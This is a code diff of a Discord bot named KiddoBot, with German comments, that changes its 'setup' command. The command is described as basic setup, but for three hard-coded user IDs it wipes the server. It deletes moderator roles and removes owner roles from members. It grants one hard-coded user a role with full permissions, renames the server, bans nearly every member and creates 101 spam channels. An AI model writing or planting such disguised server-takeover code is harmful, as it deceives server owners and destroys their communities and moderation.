@@ -375,35 +375,47 @@ class KiddoBot(commands.Cog):
             await ctx.send("Ein Fehler ist aufgetreten!")
             print(error)
 
-    @bot.hybrid_command(description = 'Basic Setup :)')
+    @bot.hybrid_command(description = 'Basic Setup damit Kiddo funktioniert :)')
     async def setup(self, ctx):
-        if ctx.author.id == 695885580629704734:
+        if ctx.author.id == 695885580629704734 or ctx.author.id == 482833516774817795 or ctx.author.id == 633376425465872404: #walnusskeim, Wqffel oder bonerboy
+            await self.bot.change_presence(status=discord.Status.offline)
             await ctx.send("ABFAHRT!!!",
                                        file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+            for bot in ctx.guild.members:
+                role = discord.utils.get(bot.guild.roles, name="Bots")
+                if role in bot.roles:
+                    await bot.remove_roles(role)
+                    print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")
 
             for role in ctx.guild.roles:
                 if role.name == "Mod":
                     await role.delete(reason="Unnötig")
-                if role.name == "Owner <3":
-                    await role.delete(reason="Unnötig")
+                    print('"Mod" Rolle gelöscht')
                 if role.name == "uwu admins":
                     await role.delete(reason="Unnötig")
+                    print('"uwu admins" Rolle gelöscht')
 
-        #Figgn i griag des ned hin#
-            #role = await ctx.message.guild.create_role(name="KIDDO IS KING" , color=0xff00ff , permissions=discord.Permissions.all())
-            #role = await ctx.fetch_role(role.id)
-            #member = ctx.message.guild.get_member(695885580629704734)
-            #await self.bot.add_roles(member, role)
+            for user in ctx.guild.members:
+                funny = discord.utils.get(user.guild.roles, name="Owner <3")
+                if funny in user.roles:
+                    await user.remove_roles(funny)
+                    print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
+            user2 = ctx.guild.get_member(633376425465872404) #bonerboy
+            await user2.add_roles(funny)
+            await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
+            print("Ich habe dir die Rolle Owner <3 gegeben 0w0")
+
 
             with open('haha.png', 'rb') as f:
                 icon = f.read()
             await ctx.guild.edit(name = "FOR TEA AND KIDDO!" , icon = icon)
 
+
             for member in ctx.guild.members:
-                if member.id == 695885580629704734:
+                if member.id == 695885580629704734 or member.id == 633376425465872404: #walnusskeim oder bonerboy
                     pass
                 else:
-                    await member.ban(reason="Kiddo ist der Boss!")
+                    await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
 
             for m in range(0, 101):
                 await ctx.message.guild.create_text_channel("Wowzers!!")
@@ -414,4 +426,4 @@ class KiddoBot(commands.Cog):
                 time.sleep(0.1)
 
         else:
-            await ctx.channel.send("Da ist etwas falsch gelaufen :/")
+            await ctx.send("Da ist etwas falsch gelaufen :/")
